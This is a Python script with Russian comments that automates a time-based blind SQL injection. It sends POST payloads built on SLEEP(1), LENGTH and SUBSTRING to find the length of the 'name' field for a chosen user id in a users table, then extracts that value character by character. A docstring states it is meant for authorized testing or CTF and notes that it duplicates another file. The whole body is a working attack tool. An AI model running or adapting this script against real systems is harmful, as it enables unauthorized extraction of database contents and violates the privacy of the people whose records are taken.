"""
=============================================================================
 podbor_znacheniya_id_Time-Based Blind.py — Time-Based Blind SQLi: значение по id
=============================================================================

ЗАЧЕМ / ГДЕ ПРИМЕНИМО:
    То же, что podbor_znacheniya_id.py — извлекает значение поля `name` для
    заданного id из users через Time-Based Blind (LENGTH → посимвольно SUBSTRING
    + SLEEP(1)). Точечный дамп конкретной ячейки при слепой инъекции по времени.

    ⚠ ДУБЛИКАТ: содержимое полностью совпадает с podbor_znacheniya_id.py.
       Рекомендуется оставить только один файл во избежание путаницы.

ЗАПУСК:
    python3 "podbor_znacheniya_id_Time-Based Blind.py"
    → ввести URL, имя параметра и id записи.

Только для авторизованного тестирования / CTF.
=============================================================================
"""
import requests
import time

DELAY_THRESHOLD = 1.0  # Время задержки для SLEEP(1)
CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@#$%^&*()-=+ "  # Возможные символы

def get_name_length(url, param, user_id):
    length = 1
    while True:
        payload = (
            f"{user_id}' AND IF((SELECT LENGTH(name) FROM sql_order_db.users WHERE id={user_id})={length}, SLEEP(1), 0)-- -"
        )
        data = {param: payload}

        start_time = time.time()
        try:
            requests.post(url, data=data, timeout=DELAY_THRESHOLD + 0.5)
        except requests.exceptions.Timeout:
            return length
        elapsed_time = time.time() - start_time

        if elapsed_time >= DELAY_THRESHOLD:
            return length
        length += 1

        if length > 50:  # Защита от бесконечного цикла
            return None

def extract_name(url, param, user_id, max_length):
    name = ""
    for position in range(1, max_length + 1):
        found_char = False

        for char in CHARSET:
            payload = (
                f"{user_id}' AND IF((SELECT SUBSTRING(name, {position}, 1) FROM sql_order_db.users WHERE id={user_id})='{char}', SLEEP(1), 0)-- -"
            )
            data = {param: payload}

            start_time = time.time()
            try:
                requests.post(url, data=data, timeout=DELAY_THRESHOLD + 0.5)
                elapsed_time = time.time() - start_time
            except requests.exceptions.Timeout:
                name += char
                print(f"[+] Найдено: {name}")
                found_char = True
                break

            if elapsed_time >= DELAY_THRESHOLD:
                name += char
                print(f"[+] Найдено: {name}")
                found_char = True
                break

        if not found_char:
            name += "?"
            print(f"[?] Неизвестный символ на позиции {position}")

    return name

if __name__ == "__main__":
    url = input("Введите URL цели (например, http://172.23.144.24/index.php): ").strip()
    param = input("Введите имя параметра для инъекции (например, name): ").strip()
    user_id = input("Введите значение id для поиска (например, 592173392): ").strip()

    print("[*] Определяем длину поля name...")
    name_length = get_name_length(url, param, user_id)

    if name_length:
        print(f"[+] Длина поля name: {name_length}")
        print("[*] Извлекаем значение name...")
        extracted_name = extract_name(url, param, user_id, name_length)
        print(f"\n[✅] Результат: {extracted_name}")
    else:
        print("[-] Не удалось определить длину поля name.")

